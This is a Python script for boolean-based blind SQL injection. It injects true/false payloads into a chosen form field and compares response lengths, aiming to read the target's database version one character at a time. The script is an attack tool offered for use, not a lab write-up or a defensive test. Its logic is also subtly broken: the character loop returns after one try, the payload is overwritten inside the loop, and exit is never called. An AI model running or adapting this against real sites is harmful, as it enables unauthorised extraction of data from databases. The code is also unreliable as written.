
import requests, sys, argparse
import urllib.parse

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', help='Target URL', required=True)
parser.add_argument('-d', '--data', help='Data; with SQLI vulnerable field as SQLI\n (eg. name=SQLI&password=test)', required=True)
parser.add_argument('-m', '--method', help='HTTP Request Method: GET or POST', required=True)
parser.add_argument('-px','--proxy',help='Enable proxy; in this format: 127.0.0.1:8080')
args = parser.parse_args()

method = None
px = None

url = args.url
data = args.data
px = args.proxy
method = args.method

# 1. identify a baseline and see how the injected TRUE and FALSE subqueries influence the HTTP responses
proxy = {'http':'http://%s' % px}
s = requests.Session()

def establish_baseline(url, method, data):
    true_statement = "AAAA')/**/or/**/(select/**/1)=1%23"
    false_statement = "AAAA')/**/or/**/(select/**/1)=0%23"

    true_payload = data.replace("SQLI", true_statement)
    false_payload = data.replace("SQLI", false_statement)

    #getting TRUE content headers
    if (method == "POST"):
        if proxy is not None:
            true_resp = s.post(url,data=true_payload, proxies=proxy)
            false_resp = s.post(url,data=false_payload, proxies=proxy)
        else:
            true_resp = s.post(url, data=true_payload)
            false_resp = s.post(url,data=false_payload)

        true_content_length = int(true_resp.headers['Content-Length'])
        false_content_length = int(false_resp.headers['Content-Length'])
        # len(r.content)
        # true_content_length = int(len(true_resp.content))
        # false_content_length = int(len(false_resp.content))
        
    elif (method == "GET"):
        if proxy is not None:
            true_resp = s.get(url,params=true_payload, proxies=proxy)
            false_resp = s.get(url,params=false_payload, proxies=proxy)
        else:
            true_resp = s.get(url, params=true_payload)
            false_resp = s.get(url,params=false_payload)
        
        true_content_length = int(true_resp.headers['Content-Length'])
        false_content_length = int(false_resp.headers['Content-Length'])
        # true_content_length = int(len(true_resp.content))
        # false_content_length = int(len(false_resp.content))

    elif (method == None):
        print('exiting...')
        sys.exit()

    else:
        print("[-] sorry! GET or POST methods only!")
        sys.exit()
    
    return true_content_length, false_content_length

def extractChar(false_content_length, url, data, inj_str):
    for j in range(32, 126):
        t = inj_str.replace("[CHAR]", str(j))
        data= data.replace("SQLI",t)

        if (method == "POST"):
            if proxy is not None:
                resp2 = s.post(url, data=data,proxies=proxy)
            else:
                resp2 = s.post(url, data=data)
        
        elif (method == "GET"):
            if proxy is not None:
                resp2 = s.get(url,params=data, proxies=proxy)
            else:
                resp2 = s.get(url, params=data)
        
        cur_content_length = int(resp2.headers['Content-Length'])
        if (cur_content_length > false_content_length):
            return j
        return None
    
def extractVersion(false_content_length,url,method,data):
    print('[*] retrieving database version...')
    for i in range(1,20):
        temp = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
        injection_str = urllib.parse.quote(temp)
        extracted_char = chr(extractChar(false_content_length,url,data,injection_str))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n[+] done!")


""" def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        exploit = url
        payload = inj_str.replace("[CHAR]", str(j))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
        return None """

def main():
    true_content_length, false_content_length = establish_baseline(url, method, data)
    if (true_content_length == false_content_length):
        print("[-] what? are you sure that's vulnerable?")
        exit
    else:
        extractVersion(false_content_length,url,method,data)


if __name__ == '__main__':
    main()    